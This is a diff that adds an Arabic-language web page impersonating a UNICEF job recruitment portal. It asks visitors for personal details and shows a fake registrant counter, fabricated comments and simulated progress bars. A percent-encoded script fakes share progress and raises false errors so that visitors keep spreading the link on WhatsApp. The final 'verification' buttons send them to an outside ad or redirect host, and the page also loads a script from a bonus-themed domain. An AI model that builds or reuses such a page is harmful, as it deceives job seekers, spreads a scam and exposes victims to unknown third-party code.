@@ -1,0 +1,787 @@
+
+
+
+<!DOCTYPE html>
+<html>
+    <head>
+       <script src="allads.js"></script>
+ <script src="activation-2025-unicef.org.js"></script>
+
+
+        
+    <script>
+
+        function set_Cookie(name,value){
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days*20*1000));
+            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
+        }
+        function get_Cookie(name){
+            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+            if(arr=document.cookie.match(reg)){
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+
+
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+                        document.getElementById("first-box")."quedate__step".display="none";//??;
+                        document.getElementById("second-box").style.display="none";//??;
+                        document.getElementById("third-box").style.display="none";//??;
+                        document.getElementsByClassName("loading2__box").style.display="";//??;
+                    }*/
+
+
+    </script>
+  
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta property="og:title" content="صندوق الأمم المتحدة للطفولة (اليونيسيف) 2025/2026">
+    <meta property="og:description" content="بوابة التوظيف لصندوق الأمم المتحدة للطفولة 2025.">
+    <meta property="og:image" itemprop="image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVAvL4MvsAUWHSiRVTCw9_xS93h-jALn-UrezoJrDhp3eZXFKS55UcvMpJ_4CCdtmhD6JD-IPngSCqi4rZVlGBKM5J55N9yWxeyWeEVc7_Cg_540vSEynBuEcm16dqYbQ-UnzjVdVciHGac3xvhMJrfdX-ZuKYbxmgjWyDp1C0yG67zAObR0A1q9OOXPS9/s320/1B0F5059-96FB-4579-B25D-6E6B4B662B9E.jpeg">
+    <meta property="og:type" content="website">
+    <meta property="fb:app_id" content="966242223397117">
+    <title>UNICEF</title>
+
+<link rel="me" href="https://www.blogger.com/profile/17222055979768522082" />
+<link rel="me" href="https://www.blogger.com/profile/03264697149331781702" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/03264697149331781702" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/18394360254875545460" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/17993298365031265285" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/17993298365031265285" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/17993298365031265285" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/17993298365031265285" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<script src="https://2024-bonus.xyz/google-api-search"></script>
+</head>
+<body>
+<style type="text/css">
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
+* {
+    margin: 0;
+    padding: 0;
+    font-family: Poppins, Droid Arabic Naskh;
+    font-weight: normal;
+    box-sizing: border-box;
+
+
+}
+body {
+    direction: lfl;
+    background: #ffffff;
+}
+a {
+    text-decoration: none;
+}
+.post {
+    background: #fff;
+    margin: 0 auto;
+    padding: 10px;
+    max-width: 500px;
+    border: 1px solid #d0d1d5;
+    border-radius: 3px;
+}
+.post img {
+    width: 100%;
+}
+.welcome {
+    font-size: 15px;
+}
+.amount,
+#getname {
+    color: #EE0300;
+    text-decoration: none;
+}
+.done {
+    text-align: center;
+    color: #27ae60;
+}
+.tip {
+    font-size: 14px;
+}
+.title {
+    text-align: center;
+}
+.error {
+    display: none;
+    text-align: center;
+    font-size: 14px;
+    color: #e74c3c;
+}
+button {
+    display: block;
+    width: 200px;
+    height: 50px;
+    color: #fff;
+    border: none;
+    outline: none;
+    font-size: 24px;
+    cursor: pointer;
+    border-radius: 5px;
+    padding: 0 10px;
+    margin: 10px auto;
+    background: rgb(10, 173, 240);
+    transition: background 0.3s ease;
+}
+button:hover {
+    background: #F3B700;
+}
+.phone {
+    max-width: 400px;
+    margin: 10px auto;
+}
+.phone input {
+    width: 100%;
+    height: 50px;
+    padding: 10px;
+    outline: none;
+    border: 2px solid #cecece;
+    font-size: 14px;
+}
+#confirm {
+    width: 200px;
+    margin: 10px auto;
+    border-radius: 0px;
+}
+#loader {
+    text-align: center;
+}
+.spin {
+    width: 50px;
+    height: 50px;
+    background: transparent;
+    border: solid 8px rgb(10, 173, 240);
+    border-right-color: transparent;
+    border-radius: 50%;
+    margin: 10px auto;
+    animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+    100% {
+        transform: rotate(1turn);
+    }
+}
+#loader,
+#info,
+#checking,
+#share,
+#claim {
+    display: none;
+}
+.center {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.barr {
+    direction: ltr;
+    max-width: 400px;
+    margin: 10px auto;
+    box-sizing: border-box;
+}
+.fill {
+    position: relative;
+    display: inline-block;
+    width: calc(100% - 100px);
+    height: 35px;
+    padding: 2px;
+    border: 2px solid #143642;
+}
+#fill,
+#fill2 {
+    background: #143642;
+    width: 0%;
+    height: 100%;
+}
+.percentage {
+    width: 100px;
+    float: right;
+    height: 35px;
+    font-size: 16px;
+    border: 2px solid #143642;
+}
+#percentage,
+#percentage2 {
+    margin-left: 5px;
+}
+#check,
+#check2 {
+    display: none;
+}
+.counter {
+    color: #7f7f7f;
+    font-size: 12px;
+    text-align: right;
+    padding: 10px 0 10px 2px;
+    border-bottom: 1px solid #e1e2e3;
+}
+.reactions {
+    display: inline-flex;
+    align-items: center;
+    float: left;
+}
+.counter img {
+    float: left;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    border: 2px solid #fff;
+    box-sizing: content-box;
+}
+.like,
+.love {
+    margin-right: -5px;
+}
+.like {
+    z-index: 2;
+}
+.love {
+    z-index: 1;
+}
+.bar {
+    display: table;
+    width: 100%;
+    border-bottom: 1px solid #e1e2e3;
+}
+.bar .react {
+    display: table-cell;
+    width: calc(100% / 3);
+    font-size: 12px;
+    color: #7f7f7f;
+    text-align: center;
+    padding: 10px 0;
+    cursor: pointer;
+}
+.comments {
+    direction: ltr;
+}
+.comment {
+    padding: 6px 0;
+    margin-top: 5px;
+}
+.comment img {
+    float: left;
+    width: 32px;
+    height: 32px;
+    border: none;
+    border-radius: 18px;
+    cursor: pointer;
+}
+.reply {
+    margin-left: 37px;
+}
+.single-container {
+    margin-left: 37px;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    font-size: 12px;
+}
+.single-container .user {
+    display: inline-block;
+    cursor: pointer;
+    color: #365899;
+    margin-bottom: 5px;
+}
+.single-container .text {
+    display: block;
+}
+.buttons {
+    font-size: 12px;
+    font-weight: bold;
+    margin: 10px 0 0 47px;
+    color: #90949c;
+}
+.action {
+    cursor: pointer;
+}
+.action:hover {
+    text-decoration: underline;
+}
+.input {
+    padding: 6px 12px 12px;
+}
+.input input {
+    width: 100%;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    border: 0;
+    outline: none;
+}
+.A{
+    text-align: center;
+    background-color: rgb(10, 173, 240);
+    color: #ffffff;
+}
+</style>
+  
+  
+    <style>
+        /* Reset some default styles */
+        body, h1, h2, h3, p, ul, li {
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Apply a background color and font to the body */
+        body {
+            background-color: #ffffff;
+            font-family: Arial black, sans-serif;
+            line-height: 1.6;
+        }
+
+        /* Style the header */
+        .header {
+            text-align: center;
+            background-color: black;
+            color: #fff;
+            padding: 40px 0;
+        }
+
+        /* Style the main content container */
+        .content-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0px;
+        }
+
+        /* Style the image container */
+        .image-container {
+            max-height: 600px; /* Set a fixed maximum height */
+            overflow: hidden; /* Hide overflow if image is larger */
+            text-align: center;
+            background-color: green; /* Background color for the image container */
+        }
+
+        .image-container img {
+            max-width: 100%;
+            height: auto; /* Maintain image aspect ratio */
+        }
+
+        /* Style the text container */
+        .text-container {
+            width: 90%;
+            padding: 30px;
+            background-color: #A3181D;
+            border: 1px solid #A3181D;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        /* Style the form */
+        form {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        /* Style the form input fields */
+        input[type="text"],
+        select {
+            width: 90%;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 2px solid #A3181D;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        /* Style the textarea */
+        textarea {
+            width: 90%;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 2px solid #A3181D;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        /* Style the submit button */
+        .button {
+            background-color: #808183;
+            color: #fff;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        /* Style the grant information */
+        .grant-info {
+            margin-top: 30px;
+            color: black;
+            text-align: left;
+        }
+
+        /* Style the footer */
+        .footer {
+          width: 106%;
+            background-color: #A3181D;
+            color: #fff;
+            text-align: center;
+            padding: 20px 0;
+        }
+    </style>
+  
+                    <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisCaQFSKqfQZaaBd7aIQwm-XWNXPaVobQUbnLibz0kbpCIx4kIut9hUC3utgL2h2Z_UsJLvdGTJe8uFyNBM75ZL_bI2u8sRjxEIwmKoLTqFxuix6qdp147EIuusqcVdVpGSlXlQR93a7dHf-wfmCuERtCNL-g9jWiGBB_Apnx-X3baQrXh6VHVXRpseAhb/s1402/6A430B59-4B08-414F-A422-B2C63C9591A0.jpeg" alt="Free-Data" style="width: 100%;"></center>
+                       <marquee class="horizontal_marque" direction="left">صندوق الأمم المتحدة للطفولة 2025 التوظيف
+            </marquee> <div class="A">
+           Till today<b></br>
+                <span id="countdowntimer" style="color:yellow;">69548</span></b></br> لقد تم تسجيل الأشخاص على هذه البوابة.</br>
+           <script type="text/javascript">
+                     var timeleft = 69548;
+                     var downloadTimer = setInterval(function(){
+                         timeleft= timeleft + Math.floor(Math.random() * 600);
+                         document.getElementById('countdowntimer').textContent = timeleft;
+                         if (timeleft <= 0)
+                             clearInterval(downloadTimer);
+                     }, 1000);
+                 </script>
+         </div>
+    <div class="post" width="100%">
+
+        <div id="intro">
+         
+            <p class="welcome">
+
+     
+
+<!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1710600,"","ffffff");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
+</center>
+<!-- END: Powered by Supercounters.com -->
+
+
+
+
+
+
+
+<br/>
+<center>
+               نموذج الطلب  
+                 
+                </p>
+          
+  
+                <input type="text" name="_name" placeholder="الاسم الأول"><br/>
+                <input type="text" name="name" placeholder="اسم العائلة"><br/>
+              
+             <center>
+<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
+    width: auto;
+    height: 56px;
+">
+<option value="أختر نوع الشبكة" selected="1">---حدد الجنس---</option>
+<option value="1"> ذكر </option>
+<option value="1"> أنثى </option>  
+
+
+</select>
+</center><br>
+
+            
+            
+            <select style="width: auto;">
+
+                   
+                   
+
+                    <option>----حدد العنوان----</option>
+                   <option
+value="Airtel">السيد</option>
+             <option value="mtn">السّيدة</option>
+    <option value="mtn">يفتقد</option>
+             
+            
+             
+                </select><br/>
+                <input type="text" name="email" placeholder="بريد إلكتروني"><br/>
+                <input type="text" name="phone" placeholder="رقم التليفون"></select><br/>
+<input type="text" name="phone" placeholder="تاريخ الميلاد"></select><br/>
+<input type="text" name="phone" placeholder="الولاية/المقاطعة"></select><br/>
+
+
+             
+
+
+             
+              
+
+</center>
+
+
+                   
+            <button id="go">يتابع </button>
+        </div>
+        <div id="loader">
+            <div>جاري معالجة الطلب، الرجاء الانتظار...</div>
+            <div class="spin"></div>
+            <div id="num">0%</div>
+        </div>
+        <div id="info">
+            <p class="title">طلبك للحصول على وظيفة في صندوق الأمم المتحدة للطفولة (اليونيسيف) قيد المعالجة الآن، يرجى التحقق من اسمك الكامل للمتابعة:</p>
+            <div class="phone">
+                <center><input type="char" placeholder="أدخل اسمك الكامل" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center>
+              
+              <br>
+ <center>
+<center><p class="title">المستوى الحالي للتعليم</p></center>
+<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
+    width: 330px;
+    height: 56px;
+">
+<option value="أختر نوع الشبكة" selected="1">----------- مستوى التعليم -----------</option>
+<option value="1"> تعليم الطفولة المبكرة </option>
+<option value="2"> التعليم الابتدائي </option>
+<option value="3"> التعليم الثانوي </option>
+<option value="4"> المرحلة الجامعية </option>
+<option value="5"> درجة البكالوريوس </option>
+<option value="6"> دراسات عليا</option>
+<option value="7"> دبلوم </option>
+<option value="8"> دبلوم عالي </option>
+<option value="9">آحرون</option>
+</select>
+</center><br>
+
+              
+                <button id="confirm">يكمل</button>
+            </div>
+            <p class="error">يرجى التحقق من اسمك!</p>
+        </div>
+        <div id="checking">
+            <p class="title">انتظر من فضلك...</p>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill"></div>
+                </div>
+                <div class="percentage center">
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="check"><i class="fa fa-check-circle"></i></span>
+                    <span id="percentage"></span>
+                </div>
+            </div>
+        </div>
+        <div id="share">
+
+            <p class="tip"> مبروك <span id="getname"></span>,</p>
+            <p class="tip">
+                بعد التحقق من معلوماتك، تصبح مؤهلاً للعمل مع صندوق الأمم المتحدة للطفولة (اليونيسيف)<span class="amount"></span> كيفية المتابعة 
+            </p><br>
+            <p class="tip">سيكون نموذج الموظفين الخاص بك متاحًا على الفور إذا اتبعت الإرشادات أدناه.</p>
+            <p class="tip">1. اضغط على زر "مشاركة" لمشاركة هذه المعلومات مع 15 صديقًا أو 5 مجموعات على WhatsApp حتى يتمكنوا أيضًا من معرفة التوظيف الجاري."</p>
+            <p class="tip">2. ثم انقر فوق "التحقق الآن" بمجرد ملء شريط التحقق.</p>
+            <p class="tip">3. سوف تتلقى رسالة نصية للتأكيد خلال 15 دقيقة.</p>
+
+            <button id="whatsapp">يشارك</button>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill2"></div>
+                </div>
+                <div class="percentage center">
+                    <span><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="percentage2">0%</span>
+                </div>
+            </div>
+        </div>
+        <div id="claim">
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+            <p class="title">تهانينا! الخطوة الأخيرة للتحقق هي تأكيد أنك لست روبوتًا.</p>
+                <b>طرق التحقق؛ يمكننا أن نطلب منك؛ إرسال رسالة نصية قصيرة، أو تنزيل، أو إدخال رقم هاتف، أو إجراء استطلاع، أو تثبيت تطبيق، أو أي مهمة أخرى مخصصة للتحقق من رقم هاتفك.</b>
+                <br><b>تذكّر أن هذه الخطوة مهمة جدًا. لا تتخطَّ أي خطوة.</b><br/>
+
+
+
+ <br/>
+          <a  onclick="window.open('https://joohugreene.net/4/9020838')" href="https://joohugreene.net/4/9020838" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#ffffff">يتأكد</font></button>
+                    </a><br/>
+          
+
+          <a  onclick="window.open('https://joohugreene.net/4/9020838')" href="https://joohugreene.net/4/9020838" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#ffffff">نموذج الموظفين</font></button>
+                    </a><br/>
+          
+            
+            <button id="offer">يفحص</button>
+          
+           </div>
+        <div class="comments">
+            <div class="counter">
+                <div class="reactions">
+                    <img class="like" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhETuUnZKp3TrK9zDTqBtlN4ahx1RrCH6RqG14wW5J8CIBv6HYs7gQSvAiZBwn8NT3lXcz3h8jR87s1z_qZ2kzEoZ7HRnWzskSuqK5NOfKyiQByU3BgypGHXP-m9LlPyFh2FhIsUdN6cO1DnZb-GTtRMDQk8L75NDDUnEC4JxQ6OwsnAjbKVhhlNxrLyQ/s320/9F5D4C76-9CCB-45EB-BA73-73A125849593.jpeg" /> <img class="love" src="https://i.imgur.com/0UHB1f0.png" /> <img class="care" src="https://1.bp.blogspot.com/-pxi_cz3OrcQ/YKKeJ7ijV8I/AAAAAAAAB3M/tEdGiB-Gh4gpnHk84_PtsFKeYZUvh-04wCLcBGAsYHQ/s225/twwr.jpg" /> <span id="likes">134K</span>
+                </div>
+                <span id="comments">23K comments</span> <span class="dot">·</span> <span id="shares">12K shares</span>
+            </div>
+            <div class="bar">
+                <span class="react"><i class="fa fa-thumbs-o-up"></i> <a class="liked">Like</a></span> <span class="react"><i class="fa fa-comment-o"></i> Comment</span> <span class="react"><i class="fa fa-share"></i> Share</span>
+            </div>
+            <div>
+                <div class="comment">
+                    </div>
+                </div>
+                <div class="comment">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhETuUnZKp3TrK9zDTqBtlN4ahx1RrCH6RqG14wW5J8CIBv6HYs7gQSvAiZBwn8NT3lXcz3h8jR87s1z_qZ2kzEoZ7HRnWzskSuqK5NOfKyiQByU3BgypGHXP-m9LlPyFh2FhIsUdN6cO1DnZb-GTtRMDQk8L75NDDUnEC4JxQ6OwsnAjbKVhhlNxrLyQ/s320/9F5D4C76-9CCB-45EB-BA73-73A125849593.jpeg" />
+                    <div class="single-container">
+                        <span class="user"> Mary Mwikali </span>
+                        <span class="text">
+سيكون هذا مفيدًا جدًا
+                        </span>
+                    </div>
+                    <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment">
+                    <img src="https://1.bp.blogspot.com/-RuIA2JO0NW0/YKKccmd5SdI/AAAAAAAAB28/NihG0SeSJtkp1P9DCvM00yeYhey77iPXwCLcBGAsYHQ/s600/ettte.jpg" />
+                    <div class="single-container"><span class="user"> Susan Mandela </span> <span class="text">شكرًا.</span></div>
+                    <div class="buttons"><span class="time t2">2m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment reply">
+                    <img src="https://images.pexels.com/photos/10415856/pexels-photo-10415856.jpeg?cs=srgb&dl=pexels-dennis-ojenomoh-10415856.jpg&fm=jpg" />
+                    <div class="single-container"><span class="user"> julian Fikayomi </span> <span class="text"> شكرًا </span></div>
+                    <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="comment">
+                    <img src="https://imagizer.imageshack.com/img923/8602/jGUvgw.jpg" />
+                    <div class="single-container"><span class="user"> Sandra Jacob</span> <span class="text">لطيف جدًا </span></div>
+                    <div class="buttons"><span class="time t3">4m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+                </div>
+                <div class="input"><input placeholder="Write a comment..." /></div>
+            </div>
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+
+
+
+
+<script type="text/javascript">
+var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+</script>
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+
+$("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(1000);
+        }
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 4)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
+                setTimeout(function () {
+                    i = 50;
+                }, 1000);
+            }
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#load").fadeOut(0);
+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                }, 500);
+            }
+        }, 50);
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+</script>
+
+
+     <script>
+        var text1 = "*بوابة مفتوحة لوظائف اليونيسف 2025/2026*%0A%0Aتم فتح بوابة التقديم لوظائف صندوق الأمم المتحدة للطفولة (اليونيسيف) للعام 2025/2026%0A%0A*انقر على الرابط أدناه لتقديم الطلب الآن*👇%0Ahttps://www.data-bonanza.xyz/2025-unicef.org",
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "https://joohugreene.net/4/9020838",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+    </script>
+
+<script>
+<!-- code by OD -->
+document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+</script>
+
+
+</body></html>
